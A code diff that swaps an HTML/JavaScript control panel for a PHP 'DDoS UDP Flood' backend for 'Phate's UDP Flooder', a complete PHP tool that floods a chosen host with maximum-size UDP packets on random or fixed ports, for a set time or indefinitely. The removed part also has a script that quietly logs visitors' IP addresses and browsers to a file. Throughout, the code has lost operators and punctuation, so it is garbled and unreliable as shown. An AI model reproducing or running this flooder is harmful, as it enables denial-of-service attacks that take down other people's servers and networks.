@@ -1,171 +1,237 @@
-<!--
-  ui.html
-   
-	Script to perform a DDoS UDP Flood by PHP
- 
-	This tool is written on educational purpose, please use it on your own good faith.
-  
-  GNU General Public License version 2.0 (GPLv2)
-	@version	0.1
--->
-<!DOCTYPE html>
-<html>
-<head>
-	<title>DDoS UDP Flood</title>
-	<meta http-equiv="content-type" content="text/html;charset=utf-8" />
-	<meta name="generator" content="Geany 1.23.1" />
-	<script>
-		// microAjax - https://github.com/TheZ3ro/microajax/
-		function microAjax(B,A){this.bindFunction=function(E,D){return function(){return E.apply(D,[D])}};this.stateChange=function(D){if(this.request.readyState==4){this.callbackFunction(this.request.responseText)}};this.getRequest=function(){if(window.ActiveXObject){return new ActiveXObject("Microsoft.XMLHTTP")}else{if(window.XMLHttpRequest){return new XMLHttpRequest()}}return false};this.postBody=(arguments[2]||"");this.callbackFunction=A;this.url=B;this.request=this.getRequest();if(this.request){var C=this.request;C.onreadystatechange=this.bindFunction(this.stateChange,this);if(this.postBody!==""){C.open("POST",B,true);C.setRequestHeader("X-Requested-With","XMLHttpRequest");C.setRequestHeader("Content-type","application/x-www-form-urlencoded");C.setRequestHeader("Connection","close")}else{C.open("GET",B,true)}C.send(this.postBody)}};
-	</script>
-</head>
-<body>
-	<div id="ddos">
-		<button id="loadLag" onClick="javascript:lagConfig();">Lag config</button>
-		<button id="loadTraffic" onClick="javascript:trafficConfig();">Traffic config</button>
-		<br />
-		<label>Host:</label><input type="text" id="host"><br/>
-		<label>Port:</label><input type="number" id="port" max=65535 min=1 step=1 value=80><br/>
-		<label>Packet:</label><input type="number" id="packet" min=1 step=1><br/>
-		<label>Time:</label><input type="number" id="time" min=1 step=1 value=5><br/>
-		<label>Bytes:</label><input type="number" id="bytes" max=65000 min=1 step=1 value=65000><br/>
-		<label>Interval:</label><input type="number" id="interval" max=10000 min=1 step=1 value=10><br/>
-		<label>Pass:</label><input type="text" id="pass"><br/>
-		<button id="send" onClick="javascript:fire();">Fire!</button>
-		<br/><br/>
-		<label>Constant attack with smart delays</label>
-		<button id="sendWithInterval" onClick="javascript:constantAttack(true);">Start</button>
-		<button id="stopInterval" disabled="true" onClick="javascript:constantAttack(false);">Stop</button>
-		<br/><br/>
-		<textarea id="log" rows="10" cols="50"></textarea>
-	</div>
-	<script>
-		var _log=document.getElementById("log");
-		var intervalHandler = null;
-		function fire(){
-			var host=document.getElementById("host").value;
-			var port=document.getElementById("port").value;
-			var packet=document.getElementById("packet").value;
-			var time=document.getElementById("time").value;
-			var pass=document.getElementById("pass").value;
-			var bytes=document.getElementById("bytes").value;
-			var interval=document.getElementById("interval").value;
-			
-			
-			if(host!="" && pass!=""){
-				inputLock(true);
-				var url='./backend.php?pass='+pass+'&host='+host+(port!=""? '&port='+port:'')+(time!=""? '&time='+time:'')+(packet!=""? '&packet='+packet:'')+(bytes!=""? '&bytes='+bytes:'')+(interval!=""? '&interval='+interval:'');
-				console.log(url);
-				microAjax(url, function(result) { 
-				_log.value=result;
-				if(_log.value.includes("Wrong password")){
-					constantAttack(false);
-				}
-				if(intervalHandler == null){
-					inputLock(false);
-				}
-				});
-			}
-			else{
-				_log.value = "Not all required parameters are filled correctly!"
-			}
-		}
-		
-		function lagConfig(){
-			packet=document.getElementById("packet").value = "";
-			time=document.getElementById("time").value = "10";
-			bytes=document.getElementById("bytes").value = "1";
-			interval=document.getElementById("interval").value = "0";
-		}
-		
-		function trafficConfig(){
-			packet=document.getElementById("packet").value = "";
-			time=document.getElementById("time").value = "5";
-			bytes=document.getElementById("bytes").value = "65000";
-			interval=document.getElementById("interval").value = "10";
-		}
-		
-		function constantAttack(status){
-			var host=document.getElementById("host").value;
-			var host=document.getElementById("pass").value;
-			var intervalTime=(document.getElementById("time").value * 1000) + 1000;
-			if(host!="" && pass!=""){
-				if(status == true){
-					fire();
-					inputLock(true);
-					intervalHandler = setInterval(fire,intervalTime);
-				}
-				else if(status == false){
-					clearInterval(intervalHandler);
-					inputLock(false);
-					intervalHandler = null;
-				}
-			}
-			else{
-				_log.value = "Not all required parameters are filled correctly!"
-			}
-		}
-		
-		function inputLock(status){
-			var inputs = document.getElementsByTagName("input");
-			var buttons = document.getElementsByTagName("button");
-			if(status == true){
-				for(i = 0;i < inputs.length;i++)
-				{
-					inputs[i].disabled = true;
-				}
-				for(i = 0;i < buttons.length;i++)
-				{
-					buttons[i].disabled = true;
-				}
-				document.getElementById("stopInterval").disabled = false;
-			}
-			else{
-				for(i = 0;i < inputs.length;i++)
-				{
-					inputs[i].disabled = false;
-				}
-				for(i = 0;i < buttons.length;i++)
-				{
-					buttons[i].disabled = false;
-				}
-				document.getElementById("stopInterval").disabled = true;
-			}
-		}
-	</script>
-</body>
-</html>
+php
 
-<?php
-$ip = getUserIP();
-$browser = $_SERVER['HTTP_USER_AGENT'];
-$dateTime = date('Y/m/d G:i:s');
-$file = "visitors.html";
-$file = fopen($file, "a");
-$data = "<pre><b>User IP</b>: $ip <b> Browser</b>: $browser <br>on Time : $dateTime <br></pre>";
-fwrite($file, $data);
-fclose($file);
+PUF Phate's UDP Flooder V1.0.10
+
+More infolatest version 
+httpsgithub.comudp-flooderpuf
+
+The MIT License (MIT)
+
+Copyleft (c) 2013 Phate ~ github.comudp-flooder
+
+Permission is hereby granted, free of charge, to any person obtaining a copy of
+this software and associated documentation files (the Software), to deal in
+the Software without restriction, including without limitation the rights to
+use, copy, modify, merge, publish, distribute, sublicense, andor sell copies of
+the Software, and to permit persons to whom the Software is furnished to do so,
+subject to the following conditions
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED AS IS, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
+FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
+COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
+IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
+CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 
 
-function getUserIP()
-{
-    $client  = @$_SERVER['HTTP_CLIENT_IP'];
-    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
-    $remote  = $_SERVER['REMOTE_ADDR'];
+$version = '1.0.10'; $file = end(explode(DIRECTORY_SEPARATOR, __FILE__)); $cache = true; $cacheData = array();
 
-    if(filter_var($client, FILTER_VALIDATE_IP))
-    {
-        $ip = $client;
+ Determine webCLI
+if (defined('PHP_SAPI')  function_exists('php_sapi_name')) {
+    if (PHP_SAPI == 'cli'  php_sapi_name() == 'cli') {
+        echo '===========================' . PHP_EOL;
+        echo 'Phate's UDP Flooder V' . $version . PHP_EOL;
+        $cli = true;
+        $args = $_SERVER['argv'];
+        if ($_SERVER['argc'] == 1  $args[1] == '-h'  $args[1] == '-help') {
+            echo 'Usage' . PHP_EOL;
+            echo $file . ' [hostip] [time=300] [port=random] [size=optimisedcache]' . PHP_EOL . PHP_EOL;
+            echo $file . ' (shows this)' . PHP_EOL;
+            echo $file . ' 1.2.3.4 (floods host for 300 seconds on random ports)' . PHP_EOL;
+            echo $file . ' 1.2.3.4 60 (floods host for 60 seconds on random ports)';
+            echo $file . ' 1.2.3.4 0 80 (floods host on fixed port, indefinitly)';
+            echo $file . ' 1.2.3.4 300 80 25000 (floods host for 300 seconds on fixed port with fixed packet-size, disabling optimised speed)' . PHP_EOL;
+            echo $file . ' host.io 0 0 35000 (floods host on random port with fixed packet-size, disabling optimised speed, indefinitly)' . PHP_EOL;
+            echo $file . ' host.io -nocache (optimised speed without cache)' . PHP_EOL;
+            echo $file . ' -showcache (shows optimised speedfrom cache)' . PHP_EOL;
+            echo '===========================' . PHP_EOL;
+            exit(0);
+        }
     }
-    elseif(filter_var($forward, FILTER_VALIDATE_IP))
-    {
-        $ip = $forward;
-    }
-    else
-    {
-        $ip = $remote;
-    }
-
-    return $ip;
 }
-?>
+if (!isset($cli)) {
+    set_time_limit(0);
+    $cli = false;
+    @ini_set('output_buffering', 'off');
+    @ini_set('zlib.output_buffering', false);
+    @ini_set('zlib.output_compression', false);
+    @ini_set('implicit_flush', true);
+    for ($ob = 0; $ob  ob_get_level(); $ob++) {
+        ob_end_flush();
+    }
+    ob_implicit_flush(true);
+    header('Content-type textplain');
+    header('Cache-control no-cache');
+    echo str_repeat(' ', 1024) . PHP_EOL;  fixes bugs
+}
+
+if ($cli) {
+    for ($i = 1; $i  count($args); $i++) {
+        if (trim($args[$i]) == '-nocache') {
+            $cache = false;
+            echo '- cache disabled' . PHP_EOL;
+        }
+        if (trim($args[$i]) == '-showcache') {
+            if (file_exists($file . '.dat')) {
+                exit(file_get_contents($file . '.dat'));
+            }
+            exit('No cache available');
+        }
+    }
+}   
+else {
+    if (isset($args['nocache']) && $args['nocache'] == 'yes') {
+        $cache = false;
+    }
+}
+
+if (file_exists($file . '.dat')) {
+    $cacheData = explode(PHP_EOL, file_get_contents($file . '.dat'));
+    foreach ($cacheData as $index = $value) {
+        $tmp = explode(';', $value);
+        $cacheData[$index] = $tmp[0];
+    }
+}
+else if (isset($_SESSION['pufsize'])) {
+    $cacheData[] = $_SESSION['pufsize'];
+}
+
+if (!$cli) {
+    $args = array();
+    if (isset($_REQUEST['hostname'])) {
+        $args[1] = $_REQUEST['hostname'];
+    }
+    if (isset($_REQUEST['time'])) {
+        $args[2] = $_REQUEST['time'];
+    }
+    if (isset($_REQUEST['port'])) {
+        $args[3] = $_REQUEST['port'];
+    }
+    if (isset($_REQUEST['size'])) {
+        $args[4] = $_REQUEST['size'];
+    }
+}
+
+if (count($args) = 2) {
+    $host = $args[1];
+    if (!isset($args[4])) {
+        if ($cache && empty($cacheData)) {
+            echo '- no cache available' . PHP_EOL;
+            echo '- creating one takes a few seconds, hold on' . PHP_EOL;
+            if (!$cli) {
+                flush();
+                ob_flush();
+            }
+        }
+    }
+    $size = isset($args[4])  intval($args[4])  getSize();
+    $strt = time();
+    $time = (isset($args[2])  intval($args[2])  300);
+    $mxtm = time() + $time;
+    $port = isset($args[3])  intval($args[3])  0;
+    $pcks = $last = 0;
+    $pckt = str_repeat('P', $size);
+    while (true) {
+        $time = (time() - $strt);
+        if (time() = $mxtm) {
+            echo str_pad(@round($pcks  $time, 2), 15) . ps     t . str_pad(@round(((($pcks  $size)  1024)  1024)  $time, 2), 7) . MBs    t  . str_pad(($mxtm - time()), 5) . seconds left     . PHP_EOL;
+            break;
+        }
+        $pcks++;
+        $tport = $port;
+        if (!$port) {
+            $tport = rand(21, 65024);
+        }
+        $fp = @fsockopen('udp' . $host, $tport, $ern, $ers, 1);
+        if ($fp) {
+            fwrite($fp, $pckt);
+            fclose($fp);
+        }
+        if ($last != time()) {
+            echo str_pad(@round($pcks  $time, 2), 15) . ps     t . str_pad(@round(((($pcks  $size)  1024)  1024)  $time, 2), 7) . MBs    t  . str_pad(($mxtm - time()), 5) . seconds left    r;
+            if (!$cli) {
+                echo PHP_EOL;
+                flush();
+                ob_flush();
+            }
+            $last = time();
+        }
+    }
+    if ($cli) {
+        exit(PHP_EOL . '===========================' . PHP_EOL);
+    }
+}
+
+function getSize() {
+    global $cli, $cacheData, $file, $host;
+    
+    if ($cli) {
+        if (!empty($cacheData[2])) {
+            return $cacheData[2];
+        }
+    }
+    else {
+        if (!empty($_SESSION['pufsize'])) {
+            return $_SESSION['pufsize'];
+        }
+    }
+    echo '[NOTICE] Performing size-check, this takes about a minute.' . PHP_EOL;
+    $size = 5000;
+    $speed = '';
+    $bestsize = 0;
+    $bestpackets = 0;
+    while ($size = 65000) {
+        $end = time() + 5;
+        $packets = 0;
+        while (true) {
+            if (time()  $end) {
+                break;
+            }
+            $package = str_repeat('X', $size);
+            $fp = @fsockopen('udp' . $host, 80, $ern, $ers, 1);
+            if ($fp) {
+                @fwrite($fp, $package);
+                fclose($fp);
+            }
+            $packets++;
+        }
+        
+        $toBeat = round( ($bestsize  $bestpackets)  5 );
+        $beatMe = round( ($size  $packets)  5 );
+         $speed = round (($beatMe  1024)  1024, 2);
+        if ($beatMe = $toBeat) {
+           
+            echo '[Update] New speed ' . $size . ' bytes, ' . $packets . 's, ' . $speed . 'MBs' . PHP_EOL;
+            $bestsize = $size;
+            $bestpackets = $packets;
+        }
+        else {
+            echo '[Skipping] ' .$size . ' bytes, ' . $packets. 's, ' . $speed . 'MBs' . PHP_EOL;
+        }
+        sleep(1);
+        $size += 5000;
+    }
+    
+    if ($cli) {
+        $fp = @fopen(str_replace('php', 'dat', $file), 'W');
+        if (!$fp) {
+            echo '[WARNING] Cache file could not be created. Optimised size is ' . $bestsize . ' at ' . $toBeat . ' MBs' . PHP_EOL;
+        }
+        else {
+            $fw = fwrite($fp, $bestsize . '; packets per request' . PHP_EOL . $toBeat . '; MBs');
+            if (!$fw) {
+                echo '[WARNING] Could not write to cache file. Optimised size is ' . $bestsize . ' at ' . $toBeat . ' MBs' . PHP_EOL;
+            }
+            fclose($fp);
+        }
+    }
+    else {
+        $_SESSION['pufsize'] = $size;
+        $_SESSION['pufspeed'] = $speed;
+    }
+    
+    return $size;
+}
